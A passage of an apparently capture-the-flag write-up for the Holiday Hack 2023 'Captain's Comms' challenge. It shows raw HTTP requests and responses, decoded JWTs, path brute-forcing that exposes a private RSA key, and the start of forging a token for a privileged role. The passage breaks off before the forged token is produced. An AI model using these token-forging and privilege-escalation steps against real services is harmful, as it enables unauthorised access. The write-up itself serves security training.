eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJISEMgMjAyMyBDYXB0YWluJ3MgQ29tbXMiLCJpYXQiOjE2OTk0ODU3OTUuMzQwMzMyNywiZXhwIjoxODA5OTM3Mzk1LjM0MDMzMjcsImF1ZCI6IkhvbGlkYXkgSGFjayAyMDIzIiwicm9sZSI6InJhZGlvTW9uaXRvciJ9.f_z24CMLim2JDKf8KP_PsJmMg3l_V9OzEwK1E_IBE9rrIGRVBZjqGpvTqAQQSesJD82LhK2h8dCcvUcF7awiAPpgZpcfM5jdkXR7DAKzaHAV0OwTRS6x_Uuo6tqGMu4XZVjGzTvba-eMGTHXyfekvtZr8uLLhvNxoarCrDLiwZ_cKLViRojGuRIhGAQCpumw6NTyLuUYovy_iymNfe7pqsXQNL_iyoUwWxfWcfwch7eGmf2mBrdEiTB6LZJ1ar0FONfrLGX19TV25Qy8auNWQIn6jczWM9WcZbuOIfOvlvKhyVWbPdAK3zB7OOm-DbWm1aFNYKr6JIRDLobPfiqhKg
```

Tossing that token into Cyberchef and using the "JWT Decode" recipe, we can verify it is for the radio "radioMonitor"

Encoded JWT

```
eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJISEMgMjAyMyBDYXB0YWluJ3MgQ29tbXMiLCJpYXQiOjE2OTk0ODU3OTUuMzQwMzMyNywiZXhwIjoxODA5OTM3Mzk1LjM0MDMzMjcsImF1ZCI6IkhvbGlkYXkgSGFjayAyMDIzIiwicm9sZSI6InJhZGlvTW9uaXRvciJ9.f_z24CMLim2JDKf8KP_PsJmMg3l_V9OzEwK1E_IBE9rrIGRVBZjqGpvTqAQQSesJD82LhK2h8dCcvUcF7awiAPpgZpcfM5jdkXR7DAKzaHAV0OwTRS6x_Uuo6tqGMu4XZVjGzTvba-eMGTHXyfekvtZr8uLLhvNxoarCrDLiwZ_cKLViRojGuRIhGAQCpumw6NTyLuUYovy_iymNfe7pqsXQNL_iyoUwWxfWcfwch7eGmf2mBrdEiTB6LZJ1ar0FONfrLGX19TV25Qy8auNWQIn6jczWM9WcZbuOIfOvlvKhyVWbPdAK3zB7OOm-DbWm1aFNYKr6JIRDLobPfiqhKg
```

Decoded JWT

```
{
    "iss": "HHC 2023 Captain's Comms",
    "iat": 1699485795.3403327,
    "exp": 1809937395.3403327,
    "aud": "Holiday Hack 2023",
    "role": "radioMonitor"
}
```

Now let's update our "Authorization Bearer" header with our new value. We know from our notes above that the captain created a /keys folder and his public key is stored in "capsPubKey.key". Let's give it a shot and see if we have access.

New Request

```
GET /jwtDefault/keys/capsPubKey.key HTTP/2
Host: captainscomms.com
Cookie: justWatchThisRole=eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJISEMgMjAyMyBDYXB0YWluJ3MgQ29tbXMiLCJpYXQiOjE2OTk0ODU3OTUuMzQwMzMyNywiZXhwIjoxODA5OTM3Mzk1LjM0MDMzMjcsImF1ZCI6IkhvbGlkYXkgSGFjayAyMDIzIiwicm9sZSI6InJhZGlvVXNlciJ9.BGxJLMZw-FHI9NRl1xt_f25EEnFcAYYu173iqf-6dgoa_X3V7SAe8scBbARyusKq2kEbL2VJ3T6e7rAVxy5Eflr2XFMM5M-Wk6Hqq1lPvkYPfL5aaJaOar3YFZNhe_0xXQ__k__oSKN1yjxZJ1WvbGuJ0noHMm_qhSXomv4_9fuqBUg1t1PmYlRFN3fNIXh3K6JEi5CvNmDWwYUqhStwQ29SM5zaeLHJzmQ1Ey0T1GG-CsQo9XnjIgXtf9x6dAC00LYXe1AMly4xJM9DfcZY_KjfP-viyI7WYL0IJ_UOtIMMN0u-XO8Q_F3VO0NyRIhZPfmALOM2Liyqn6qYTjLnkg; CaptainsCookie=eyJjYXB0YWluc1ZpY3RvcnkiOjAsInVzZXJpZCI6IjI0NjExY2I5LTZkNjItNDg5MS1iOTkzLTIyNzZiZDE2YzVkZCJ9.ZXs29A.NpdDZXueG5YZHem9tKsa-WxgR7I
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://captainscomms.com/?&challenge=capcom&username=cmdncontrol&id=24611cb9-6d62-4891-b993-2276bd16c5dd&area=spi-brassbouyport&location=32,34&tokens=&dna=ATATATTAATATATATATATTAATATATATATCGTATAATATATATATATATATCGATATATATATATATCGATATATCGATATATATATATGCGCATATATATATATGCGCATATTACG
Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJISEMgMjAyMyBDYXB0YWluJ3MgQ29tbXMiLCJpYXQiOjE2OTk0ODU3OTUuMzQwMzMyNywiZXhwIjoxODA5OTM3Mzk1LjM0MDMzMjcsImF1ZCI6IkhvbGlkYXkgSGFjayAyMDIzIiwicm9sZSI6InJhZGlvTW9uaXRvciJ9.f_z24CMLim2JDKf8KP_PsJmMg3l_V9OzEwK1E_IBE9rrIGRVBZjqGpvTqAQQSesJD82LhK2h8dCcvUcF7awiAPpgZpcfM5jdkXR7DAKzaHAV0OwTRS6x_Uuo6tqGMu4XZVjGzTvba-eMGTHXyfekvtZr8uLLhvNxoarCrDLiwZ_cKLViRojGuRIhGAQCpumw6NTyLuUYovy_iymNfe7pqsXQNL_iyoUwWxfWcfwch7eGmf2mBrdEiTB6LZJ1ar0FONfrLGX19TV25Qy8auNWQIn6jczWM9WcZbuOIfOvlvKhyVWbPdAK3zB7OOm-DbWm1aFNYKr6JIRDLobPfiqhKg
X-Request-Item: tx
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers
```

Response

```
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
Vary: Accept-Encoding
X-Cloud-Trace-Context: fc4c5e2ce2e9e0103ca281695f292de9;o=1
Date: Thu, 14 Dec 2023 17:23:06 GMT
Server: Google Frontend
Cache-Control: private
Content-Length: 451
Via: 1.1 google, 1.1 google
Alt-Svc: h3=":443"; ma=2592000,h3-29=":443"; ma=2592000

-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAsJZuLJVB4EftUOQN1Auw
VzJyr1Ma4xFo6EsEzrkprnQcdgwz2iMM76IEiH8FlgKZG1U0RU4N3suI24NJsb5w
J327IYXAuOLBLzIN65nQhJ9wBPR7Wd4Eoo2wJP2m2HKwkW5Yadj6T2YgwZLmod3q
n6JlhN03DOk1biNuLDyWao+MPmg2RcxDR2PRnfBartzw0HPB1yC2Sp33eDGkpIXa
cx/lGVHFVxE1ptXP+asOAzK1wEezyDjyUxZcMMmV0VibzeXbxsXYvV3knScr2WYO
qZ5ssa4Rah9sWnm0CKG638/lVD9kwbvcO2lMlUeTp7vwOTXEGyadpB0WsuIKuPH6
uQIDAQAB
-----END PUBLIC KEY-----
```

Captains Public Key

```
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAsJZuLJVB4EftUOQN1Auw
VzJyr1Ma4xFo6EsEzrkprnQcdgwz2iMM76IEiH8FlgKZG1U0RU4N3suI24NJsb5w
J327IYXAuOLBLzIN65nQhJ9wBPR7Wd4Eoo2wJP2m2HKwkW5Yadj6T2YgwZLmod3q
n6JlhN03DOk1biNuLDyWao+MPmg2RcxDR2PRnfBartzw0HPB1yC2Sp33eDGkpIXa
cx/lGVHFVxE1ptXP+asOAzK1wEezyDjyUxZcMMmV0VibzeXbxsXYvV3knScr2WYO
qZ5ssa4Rah9sWnm0CKG638/lVD9kwbvcO2lMlUeTp7vwOTXEGyadpB0WsuIKuPH6
uQIDAQAB
-----END PUBLIC KEY-----
```

After some bruteforcing and trial and error, I was able to file the Decoder token. 

Request

```
GET /jwtDefault/rDecoder.tok HTTP/2
Host: captainscomms.com
Cookie: justWatchThisRole=eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJISEMgMjAyMyBDYXB0YWluJ3MgQ29tbXMiLCJpYXQiOjE2OTk0ODU3OTUuMzQwMzMyNywiZXhwIjoxODA5OTM3Mzk1LjM0MDMzMjcsImF1ZCI6IkhvbGlkYXkgSGFjayAyMDIzIiwicm9sZSI6InJhZGlvVXNlciJ9.BGxJLMZw-FHI9NRl1xt_f25EEnFcAYYu173iqf-6dgoa_X3V7SAe8scBbARyusKq2kEbL2VJ3T6e7rAVxy5Eflr2XFMM5M-Wk6Hqq1lPvkYPfL5aaJaOar3YFZNhe_0xXQ__k__oSKN1yjxZJ1WvbGuJ0noHMm_qhSXomv4_9fuqBUg1t1PmYlRFN3fNIXh3K6JEi5CvNmDWwYUqhStwQ29SM5zaeLHJzmQ1Ey0T1GG-CsQo9XnjIgXtf9x6dAC00LYXe1AMly4xJM9DfcZY_KjfP-viyI7WYL0IJ_UOtIMMN0u-XO8Q_F3VO0NyRIhZPfmALOM2Liyqn6qYTjLnkg; CaptainsCookie=eyJjYXB0YWluc1ZpY3RvcnkiOjAsInVzZXJpZCI6IjI0NjExY2I5LTZkNjItNDg5MS1iOTkzLTIyNzZiZDE2YzVkZCJ9.ZXs29A.NpdDZXueG5YZHem9tKsa-WxgR7I
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://captainscomms.com/?&challenge=capcom&username=cmdncontrol&id=24611cb9-6d62-4891-b993-2276bd16c5dd&area=spi-brassbouyport&location=32,34&tokens=&dna=ATATATTAATATATATATATTAATATATATATCGTATAATATATATATATATATCGATATATATATATATCGATATATCGATATATATATATGCGCATATATATATATGCGCATATTACG
Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJISEMgMjAyMyBDYXB0YWluJ3MgQ29tbXMiLCJpYXQiOjE2OTk0ODU3OTUuMzQwMzMyNywiZXhwIjoxODA5OTM3Mzk1LjM0MDMzMjcsImF1ZCI6IkhvbGlkYXkgSGFjayAyMDIzIiwicm9sZSI6InJhZGlvTW9uaXRvciJ9.f_z24CMLim2JDKf8KP_PsJmMg3l_V9OzEwK1E_IBE9rrIGRVBZjqGpvTqAQQSesJD82LhK2h8dCcvUcF7awiAPpgZpcfM5jdkXR7DAKzaHAV0OwTRS6x_Uuo6tqGMu4XZVjGzTvba-eMGTHXyfekvtZr8uLLhvNxoarCrDLiwZ_cKLViRojGuRIhGAQCpumw6NTyLuUYovy_iymNfe7pqsXQNL_iyoUwWxfWcfwch7eGmf2mBrdEiTB6LZJ1ar0FONfrLGX19TV25Qy8auNWQIn6jczWM9WcZbuOIfOvlvKhyVWbPdAK3zB7OOm-DbWm1aFNYKr6JIRDLobPfiqhKg
X-Request-Item: tx
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers
```

Response

```
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
Vary: Accept-Encoding
X-Cloud-Trace-Context: 0b94a255481905dd4598cef23eadd1e7
Date: Thu, 14 Dec 2023 19:42:00 GMT
Server: Google Frontend
Cache-Control: private
Content-Length: 556
Via: 1.1 google, 1.1 google
Alt-Svc: h3=":443"; ma=2592000,h3-29=":443"; ma=2592000

eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJISEMgMjAyMyBDYXB0YWluJ3MgQ29tbXMiLCJpYXQiOjE2OTk0ODU3OTUuMzQwMzMyNywiZXhwIjoxODA5OTM3Mzk1LjM0MDMzMjcsImF1ZCI6IkhvbGlkYXkgSGFjayAyMDIzIiwicm9sZSI6InJhZGlvRGVjb2RlciJ9.cnNu6EjIDBrq8PbMlQNF7GzTqtOOLO0Q2zAKBRuza9bHMZGFx0pOmeCy2Ltv7NUPv1yT9NZ-WapQ1-GNcw011Ssbxz0yQO3Mh2Tt3rS65dmb5cmYIZc0pol-imtclWh5s1OTGUtqSjbeeZ2QAMUFx3Ad93gR20pKpjmoeG_Iec4JHLTJVEksogowOouGyDxNAagIICSpe61F3MY1qTibOLSbq3UVfiIJS4XvGJwqbYfLdbhc-FvHWBUbHhAzIgTIyx6kfONOH9JBo2RRQKvN-0K37aJRTqbq99mS4P9PEVs0-YIIufUxJGIW0TdMNuVO3or6bIeVH6CjexIl14w6fg 
```

Encoded JWT

```
eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJISEMgMjAyMyBDYXB0YWluJ3MgQ29tbXMiLCJpYXQiOjE2OTk0ODU3OTUuMzQwMzMyNywiZXhwIjoxODA5OTM3Mzk1LjM0MDMzMjcsImF1ZCI6IkhvbGlkYXkgSGFjayAyMDIzIiwicm9sZSI6InJhZGlvRGVjb2RlciJ9.cnNu6EjIDBrq8PbMlQNF7GzTqtOOLO0Q2zAKBRuza9bHMZGFx0pOmeCy2Ltv7NUPv1yT9NZ-WapQ1-GNcw011Ssbxz0yQO3Mh2Tt3rS65dmb5cmYIZc0pol-imtclWh5s1OTGUtqSjbeeZ2QAMUFx3Ad93gR20pKpjmoeG_Iec4JHLTJVEksogowOouGyDxNAagIICSpe61F3MY1qTibOLSbq3UVfiIJS4XvGJwqbYfLdbhc-FvHWBUbHhAzIgTIyx6kfONOH9JBo2RRQKvN-0K37aJRTqbq99mS4P9PEVs0-YIIufUxJGIW0TdMNuVO3or6bIeVH6CjexIl14w6fg
```

Decoded JWT

```
{
    "iss": "HHC 2023 Captain's Comms",
    "iat": 1699485795.3403327,
    "exp": 1809937395.3403327,
    "aud": "Holiday Hack 2023",
    "role": "radioDecoder"
}
```

Now we can assume the "radioDecoder" role by updating our "justWatchThisRole" cookie in our browser. Once we have that role, we can begin to utilize the console in the middle of the room to decode messages. 

Message 1: CW Decoder

```
... CQ CQ CQ DE KH644 -- SILLY CAPTAIN! WE FOUND HIS FANCY RADIO PRIVATE
KEY IN A FOLDER CALLED TH3CAPSPR1V4T3F0LD3R ...
```

Message 2: Audio-Text Decoder

```
(music) (music) (music) 88323 88323 88323 (gong) (gong) (gong) (gong)
(gong) (gong) 12249 12249 16009 16009 12249 12249 16009 16009 (gong) (gong) 
(gong) (gong) (gong) (gong) (music) (music) (music)
```

Message 3: RadioFax Decoder

![](/docs/assets/images/comms1.png)

In the image we can see -- Freq: 10426Hz, let's keep this in mind

Let's focus on "Message 1: CW Decoder" to try to get the Private Key. We now know the folder it is stored in, we just need to guess the file name. Let's update our token in the header to be "radioDecoder". Now, let's just start with the publickey filename and bruteforce a few tries knowing that the captain likes to abbreviate.

Request

```
GET /jwtDefault/keys/TH3CAPSPR1V4T3F0LD3R/capsPrivKey.key HTTP/2
Host: captainscomms.com
Cookie: justWatchThisRole=eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJISEMgMjAyMyBDYXB0YWluJ3MgQ29tbXMiLCJpYXQiOjE2OTk0ODU3OTUuMzQwMzMyNywiZXhwIjoxODA5OTM3Mzk1LjM0MDMzMjcsImF1ZCI6IkhvbGlkYXkgSGFjayAyMDIzIiwicm9sZSI6InJhZGlvRGVjb2RlciJ9.cnNu6EjIDBrq8PbMlQNF7GzTqtOOLO0Q2zAKBRuza9bHMZGFx0pOmeCy2Ltv7NUPv1yT9NZ-WapQ1-GNcw011Ssbxz0yQO3Mh2Tt3rS65dmb5cmYIZc0pol-imtclWh5s1OTGUtqSjbeeZ2QAMUFx3Ad93gR20pKpjmoeG_Iec4JHLTJVEksogowOouGyDxNAagIICSpe61F3MY1qTibOLSbq3UVfiIJS4XvGJwqbYfLdbhc-FvHWBUbHhAzIgTIyx6kfONOH9JBo2RRQKvN-0K37aJRTqbq99mS4P9PEVs0-YIIufUxJGIW0TdMNuVO3or6bIeVH6CjexIl14w6fg; CaptainsCookie=eyJjYXB0YWluc1ZpY3RvcnkiOjAsInVzZXJpZCI6IjhiOWEzNTAzLTYyYjYtNDViMy1hYTI2LTc4MDA4OTY3NGQ5ZSJ9.ZXteOQ.-R-mPgfW5zKh3AXusJTNVEkwTWY
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://captainscomms.com/?&challenge=capcom&username=cmdncontrol&id=8b9a3503-62b6-45b3-aa26-780089674d9e&area=spi-brassbouyport&location=32,34&tokens=&dna=ATATATTAATATATATATATTAATATATATATCGTATAATATATATATATATATCGATATATATATATATCGATATATCGATATATATATATGCGCATATATATATATGCGCATATTACG
Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJISEMgMjAyMyBDYXB0YWluJ3MgQ29tbXMiLCJpYXQiOjE2OTk0ODU3OTUuMzQwMzMyNywiZXhwIjoxODA5OTM3Mzk1LjM0MDMzMjcsImF1ZCI6IkhvbGlkYXkgSGFjayAyMDIzIiwicm9sZSI6InJhZGlvRGVjb2RlciJ9.cnNu6EjIDBrq8PbMlQNF7GzTqtOOLO0Q2zAKBRuza9bHMZGFx0pOmeCy2Ltv7NUPv1yT9NZ-WapQ1-GNcw011Ssbxz0yQO3Mh2Tt3rS65dmb5cmYIZc0pol-imtclWh5s1OTGUtqSjbeeZ2QAMUFx3Ad93gR20pKpjmoeG_Iec4JHLTJVEksogowOouGyDxNAagIICSpe61F3MY1qTibOLSbq3UVfiIJS4XvGJwqbYfLdbhc-FvHWBUbHhAzIgTIyx6kfONOH9JBo2RRQKvN-0K37aJRTqbq99mS4P9PEVs0-YIIufUxJGIW0TdMNuVO3or6bIeVH6CjexIl14w6fg
X-Request-Item: tx
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers
```

Response

```
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
Vary: Accept-Encoding
X-Cloud-Trace-Context: b15b9b1454bcf8ccf7cadf94c70b295d
Date: Thu, 14 Dec 2023 21:30:00 GMT
Server: Google Frontend
Cache-Control: private
Content-Length: 1704
Via: 1.1 google, 1.1 google
Alt-Svc: h3=":443"; ma=2592000,h3-29=":443"; ma=2592000

-----BEGIN PRIVATE KEY-----
MIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQCwlm4slUHgR+1Q
5A3UC7BXMnKvUxrjEWjoSwTOuSmudBx2DDPaIwzvogSIfwWWApkbVTRFTg3ey4jb
g0mxvnAnfbshhcC44sEvMg3rmdCEn3AE9HtZ3gSijbAk/abYcrCRblhp2PpPZiDB
kuah3eqfomWE3TcM6TVuI24sPJZqj4w+aDZFzENHY9Gd8Fqu3PDQc8HXILZKnfd4
MaSkhdpzH+UZUcVXETWm1c/5qw4DMrXAR7PIOPJTFlwwyZXRWJvN5dvGxdi9XeSd
JyvZZg6pnmyxrhFqH2xaebQIobrfz+VUP2TBu9w7aUyVR5Onu/A5NcQbJp2kHRay
4gq48fq5AgMBAAECggEATlcmYJQE6i2uvFS4R8q5vC1u0JYzVupJ2sgxRU7DDZiI
adyHAm7LVeJQVYfYoBDeANC/hEGZCK7OM+heQMMGOZbfdoNCmSNL5ha0M0IFTlj3
VtNph9hlwQHP09FN/DeBWruT8L1oauIZhRcZR1VOuexPUm7bddheMlL4lRp59qKj
9k1hUQ3R3qAYST2EnqpEk1NV3TirnhIcAod53aAzcAqg/VruoPhdwmSv/xrfDS9R
DCxOzplHbVQ7sxZSt6URO/El6BrkvVvJEqECMUdON4agNEK5IYAFuIbETFNSu1TP
/dMvnR1fpM0lPOXeUKPNFveGKCc7B4IF2aDQ/CvD+wKBgQDpJjHSbtABNaJqVJ3N
/pMROk+UkTbSW69CgiH03TNJ9RflVMphwNfFJqwcWUwIEsBpe+Wa3xE0ZatecEM9
4PevvXGujmfskst/PuCuDwHnQ5OkRwaGIkujmBaNFmpkF+51v6LNdnt8UPGrkovD
onQIEjmvS1b53eUhDI91eysPKwKBgQDB5RVaS7huAJGJOgMpKzu54N6uljSwoisz
YJRY+5V0h65PucmZHPHe4/+cSUuuhMWOPinr+tbZtwYaiX04CNK1s8u4qqcX2ZRD
YuEv+WNDv2e1XjoWCTxfP71EorywkEyCnZq5kax3cPOqBs4UvSmsR9JiYKdeXfaC
VGiUyJgLqwKBgQDL+VZtO/VOmZXWYOEOb0JLODCXUdQchYn3LdJ3X26XrY2SXXQR
wZ0EJqk8xAL4rS8ZGgPuUmnC5Y/ft2eco00OuzbR+FSDbIoMcP4wSYDoyv5IIrta
bnauUUipdorttuIwsc/E4Xt3b3l/GV6dcWsCBK/i5I7bW34yQ8LejTtGsQKBgAmx
NdwJpPJ6vMurRrUsIBQulXMMtx2NPbOXxFKeYN4uWhxKITWyKLUHmKNrVokmwelW
Wiodo9fGOlvhO40tg7rpfemBPlEG405rBu6q/LdKPhjm2Oh5Fbd9LCzeJah9zhVJ
Y46bJY/i6Ys6Q9rticO+41lfk344HDZvmbq2PEN5AoGBANrYUVhKdTY0OmxLOrBb
kk8qpMhJycpmLFwymvFf0j3dWzwo8cY/+2zCFEtv6t1r7b8bjz/NYrwS0GvEc6Bj
xVa9JIGLTKZt+VRYMP1V+uJEmgSnwUFKrXPrAsyRaMcq0HAvQOMICX4ZvGyzWhut
UdQXV73mNwnYl0RQmBnDOl+i
-----END PRIVATE KEY-----
```

Captain's Private Key

```
-----BEGIN PRIVATE KEY-----
MIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQCwlm4slUHgR+1Q
5A3UC7BXMnKvUxrjEWjoSwTOuSmudBx2DDPaIwzvogSIfwWWApkbVTRFTg3ey4jb
g0mxvnAnfbshhcC44sEvMg3rmdCEn3AE9HtZ3gSijbAk/abYcrCRblhp2PpPZiDB
kuah3eqfomWE3TcM6TVuI24sPJZqj4w+aDZFzENHY9Gd8Fqu3PDQc8HXILZKnfd4
MaSkhdpzH+UZUcVXETWm1c/5qw4DMrXAR7PIOPJTFlwwyZXRWJvN5dvGxdi9XeSd
JyvZZg6pnmyxrhFqH2xaebQIobrfz+VUP2TBu9w7aUyVR5Onu/A5NcQbJp2kHRay
4gq48fq5AgMBAAECggEATlcmYJQE6i2uvFS4R8q5vC1u0JYzVupJ2sgxRU7DDZiI
adyHAm7LVeJQVYfYoBDeANC/hEGZCK7OM+heQMMGOZbfdoNCmSNL5ha0M0IFTlj3
VtNph9hlwQHP09FN/DeBWruT8L1oauIZhRcZR1VOuexPUm7bddheMlL4lRp59qKj
9k1hUQ3R3qAYST2EnqpEk1NV3TirnhIcAod53aAzcAqg/VruoPhdwmSv/xrfDS9R
DCxOzplHbVQ7sxZSt6URO/El6BrkvVvJEqECMUdON4agNEK5IYAFuIbETFNSu1TP
/dMvnR1fpM0lPOXeUKPNFveGKCc7B4IF2aDQ/CvD+wKBgQDpJjHSbtABNaJqVJ3N
/pMROk+UkTbSW69CgiH03TNJ9RflVMphwNfFJqwcWUwIEsBpe+Wa3xE0ZatecEM9
4PevvXGujmfskst/PuCuDwHnQ5OkRwaGIkujmBaNFmpkF+51v6LNdnt8UPGrkovD
onQIEjmvS1b53eUhDI91eysPKwKBgQDB5RVaS7huAJGJOgMpKzu54N6uljSwoisz
YJRY+5V0h65PucmZHPHe4/+cSUuuhMWOPinr+tbZtwYaiX04CNK1s8u4qqcX2ZRD
YuEv+WNDv2e1XjoWCTxfP71EorywkEyCnZq5kax3cPOqBs4UvSmsR9JiYKdeXfaC
VGiUyJgLqwKBgQDL+VZtO/VOmZXWYOEOb0JLODCXUdQchYn3LdJ3X26XrY2SXXQR
wZ0EJqk8xAL4rS8ZGgPuUmnC5Y/ft2eco00OuzbR+FSDbIoMcP4wSYDoyv5IIrta
bnauUUipdorttuIwsc/E4Xt3b3l/GV6dcWsCBK/i5I7bW34yQ8LejTtGsQKBgAmx
NdwJpPJ6vMurRrUsIBQulXMMtx2NPbOXxFKeYN4uWhxKITWyKLUHmKNrVokmwelW
Wiodo9fGOlvhO40tg7rpfemBPlEG405rBu6q/LdKPhjm2Oh5Fbd9LCzeJah9zhVJ
Y46bJY/i6Ys6Q9rticO+41lfk344HDZvmbq2PEN5AoGBANrYUVhKdTY0OmxLOrBb
kk8qpMhJycpmLFwymvFf0j3dWzwo8cY/+2zCFEtv6t1r7b8bjz/NYrwS0GvEc6Bj
xVa9JIGLTKZt+VRYMP1V+uJEmgSnwUFKrXPrAsyRaMcq0HAvQOMICX4ZvGyzWhut
UdQXV73mNwnYl0RQmBnDOl+i
-----END PRIVATE KEY-----
```

Let's construct our new JWT using [JSON Web Tokens - jwt.io](https://jwt.io/#debugger-io)...

```
Header:
{"alg":"RS256","typ":"JWT"}

Payload:
{"iss":"HHC 2023 Captain's Comms","iat":1699485795.3403327,"exp":1809937395.3403327,"aud":"Holiday Hack 2023","role":"GeeseIslandsSuperChiefCommunicationsOfficer"}


Public Key:
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAsJZuLJVB4EftUOQN1Auw
VzJyr1Ma4xFo6EsEzrkprnQcdgwz2iMM76IEiH8FlgKZG1U0RU4N3suI24NJsb5w
J327IYXAuOLBLzIN65nQhJ9wBPR7Wd4Eoo2wJP2m2HKwkW5Yadj6T2YgwZLmod3q
n6JlhN03DOk1biNuLDyWao+MPmg2RcxDR2PRnfBartzw0HPB1yC2Sp33eDGkpIXa
cx/lGVHFVxE1ptXP+asOAzK1wEezyDjyUxZcMMmV0VibzeXbxsXYvV3knScr2WYO
qZ5ssa4Rah9sWnm0CKG638/lVD9kwbvcO2lMlUeTp7vwOTXEGyadpB0WsuIKuPH6
uQIDAQAB
-----END PUBLIC KEY-----

Private Key:
-----BEGIN PRIVATE KEY-----
MIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQCwlm4slUHgR+1Q
5A3UC7BXMnKvUxrjEWjoSwTOuSmudBx2DDPaIwzvogSIfwWWApkbVTRFTg3ey4jb
g0mxvnAnfbshhcC44sEvMg3rmdCEn3AE9HtZ3gSijbAk/abYcrCRblhp2PpPZiDB
kuah3eqfomWE3TcM6TVuI24sPJZqj4w+aDZFzENHY9Gd8Fqu3PDQc8HXILZKnfd4
MaSkhdpzH+UZUcVXETWm1c/5qw4DMrXAR7PIOPJTFlwwyZXRWJvN5dvGxdi9XeSd
JyvZZg6pnmyxrhFqH2xaebQIobrfz+VUP2TBu9w7aUyVR5Onu/A5NcQbJp2kHRay
4gq48fq5AgMBAAECggEATlcmYJQE6i2uvFS4R8q5vC1u0JYzVupJ2sgxRU7DDZiI
adyHAm7LVeJQVYfYoBDeANC/hEGZCK7OM+heQMMGOZbfdoNCmSNL5ha0M0IFTlj3
VtNph9hlwQHP09FN/DeBWruT8L1oauIZhRcZR1VOuexPUm7bddheMlL4lRp59qKj
9k1hUQ3R3qAYST2EnqpEk1NV3TirnhIcAod53aAzcAqg/VruoPhdwmSv/xrfDS9R
DCxOzplHbVQ7sxZSt6URO/El6BrkvVvJEqECMUdON4agNEK5IYAFuIbETFNSu1TP
/dMvnR1fpM0lPOXeUKPNFveGKCc7B4IF2aDQ/CvD+wKBgQDpJjHSbtABNaJqVJ3N
/pMROk+UkTbSW69CgiH03TNJ9RflVMphwNfFJqwcWUwIEsBpe+Wa3xE0ZatecEM9
4PevvXGujmfskst/PuCuDwHnQ5OkRwaGIkujmBaNFmpkF+51v6LNdnt8UPGrkovD
onQIEjmvS1b53eUhDI91eysPKwKBgQDB5RVaS7huAJGJOgMpKzu54N6uljSwoisz
YJRY+5V0h65PucmZHPHe4/+cSUuuhMWOPinr+tbZtwYaiX04CNK1s8u4qqcX2ZRD
YuEv+WNDv2e1XjoWCTxfP71EorywkEyCnZq5kax3cPOqBs4UvSmsR9JiYKdeXfaC
VGiUyJgLqwKBgQDL+VZtO/VOmZXWYOEOb0JLODCXUdQchYn3LdJ3X26XrY2SXXQR
wZ0EJqk8xAL4rS8ZGgPuUmnC5Y/ft2eco00OuzbR+FSDbIoMcP4wSYDoyv5IIrta
bnauUUipdorttuIwsc/E4Xt3b3l/GV6dcWsCBK/i5I7bW34yQ8LejTtGsQKBgAmx
NdwJpPJ6vMurRrUsIBQulXMMtx2NPbOXxFKeYN4uWhxKITWyKLUHmKNrVokmwelW
Wiodo9fGOlvhO40tg7rpfemBPlEG405rBu6q/LdKPhjm2Oh5Fbd9LCzeJah9zhVJ
Y46bJY/i6Ys6Q9rticO+41lfk344HDZvmbq2PEN5AoGBANrYUVhKdTY0OmxLOrBb
kk8qpMhJycpmLFwymvFf0j3dWzwo8cY/+2zCFEtv6t1r7b8bjz/NYrwS0GvEc6Bj
xVa9JIGLTKZt+VRYMP1V+uJEmgSnwUFKrXPrAsyRaMcq0HAvQOMICX4ZvGyzWhut
UdQXV73mNwnYl0RQmBnDOl+i
-----END PRIVATE KEY-----

Encoded JWT:
